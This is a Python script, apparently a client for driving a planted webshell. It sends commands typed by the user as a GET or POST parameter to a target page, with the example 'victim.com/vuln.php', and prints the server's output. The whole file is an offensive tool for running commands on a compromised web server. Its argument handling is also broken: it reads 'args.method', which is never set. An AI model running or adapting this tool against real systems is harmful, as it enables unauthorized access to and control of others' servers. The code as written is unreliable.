#!/usr/bin/env python

import requests
import argparse
import sys
import readline

parser = argparse.ArgumentParser()

parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
parser.add_argument("-X" , "--method", metavar="METHOD", dest="METHOD", help="The method (GET/POST) that that is used ( Default: GET)", default="GET", nargs=1)
parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked. Example: http://www.victim.com/vuln.php", required=True, nargs=1)
parser.add_argument("-D", "--debug", dest="debug", help="If set the programm does print debug messages", action='store_true', default=False)

args = parser.parse_args()
args.method = args.method.upper()
if args.method not in ["GET", "POST"]:
    print(f"[!] Method {args.method} not recognized")
    sys.exit()
if args.debug:
    print("[!] Shellbind is ready. You can run commands now")
while True:
    try:
        command = input("$ ")
        if args.method == "GET":
            params = {args.para_name[0]: command}
            res = requests.get(args.host[0], params=params)
        else:
            params = {args.para_name[0]: command}
            res = requests.post(args.host[0], data=params)
        print(res.text)
    except KeyboardInterrupt:
        if args.debug:
            print("[!] Exiting Connection to webshell")
        sys.exit()

